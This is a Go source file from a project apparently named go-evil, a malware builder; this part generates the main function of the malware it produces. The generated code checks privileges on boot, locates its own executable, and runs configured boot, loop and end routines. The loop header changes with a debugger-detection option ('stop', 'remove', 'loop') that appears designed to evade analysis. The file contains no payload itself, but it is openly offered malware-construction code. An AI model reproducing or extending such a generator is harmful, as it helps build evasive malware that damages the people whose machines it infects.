package generate

import (
	"fmt"

	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
)

// Generates the main function of the malware
func Generate_main(data_object *json.Json_t) {

	// Create the main function here
	body := []string{}
	body = append(body, "spine.logging_lvl = \"0\"")
	// Adds all arguments
	body = append(body, "parser := argumentparser.Constructor(true)")
	body = append(body, "parser.Add(\"verbose\", \"-v\", false, false, \"Show all generated logs during runtime\")", "parsed := parser.Parse()")
	body = append(body, "if _, ok := parsed[\"-v\"]; ok{", "spine.logging_lvl = \"3\"", "}")

	body = append(body, fmt.Sprintf("spine.alpha.alphabet = %s", data_object.Get_alphabet()))
	body = append(body, "spine.terminate = false")
	body = append(body, "spine.return_code = 0")
	body = append(body, "spine.notify_handler.SetLvl(spine.logging_lvl)")

	// Adds all the €1€ - €5€ to the final malware
	body = append(body, fmt.Sprintf("spine.variable.roof = %d", data_object.Var_max))
	body = append(body, "spine.variable.pointer = 0")
	body = append(body, "spine.variable.values = make([]string, spine.variable.roof)")

	for i := 0; i < data_object.Var_max; i++ { // Add default value for each entry
		body = append(body, fmt.Sprintf("spine.variable.values[%d] = \"NULL\"", i))
	}

	// Checks if the malware has any priviliges on boot
	body = append(body, "spine.check_privileges()")

	// Figures out the malwares current position
	body = append(body, "spine.path = gotools.GrabExecutablePath()")

	// Add boot functions
	for _, boot_name := range data_object.Boot_functions {
		body = append(body, fmt.Sprintf("%s()", boot_name))
	}

	// Decide the header of the for "infinite" loop
	switch data_object.Debugger_behavior {
	case "stop":
		body = append(body, "for !spine.terminate && !stop_behavior() {")
	case "remove":
		body = append(body, "for !spine.terminate && !remove_behavior() {")
	case "none":
		body = append(body, "for !spine.terminate {")
	case "loop":
		body = append(body, "for !spine.terminate && !loop_behavior() {")
	}

	// Add loop function
	for _, loop_name := range data_object.Loop_functions {
		body = append(body, fmt.Sprintf("%s()", loop_name))
	}

	// Add the footer
	body = append(body, "}")

	// Add end functions
	for _, end_name := range data_object.End_functions {
		body = append(body, fmt.Sprintf("%s()", end_name))
	}

	// Add exit call
	body = append(body, "os.Exit(spine.return_code)")

	data_object.Add_go_function(functions.Go_func_t{Name: "main", Func_type: "", Part_of_struct: "", Return_type: "", Parameters: []string{}, Gut: body})

	data_object.Add_go_import("github.com/s9rA16Bf4/ArgumentParser")
	data_object.Add_go_import("os")

}
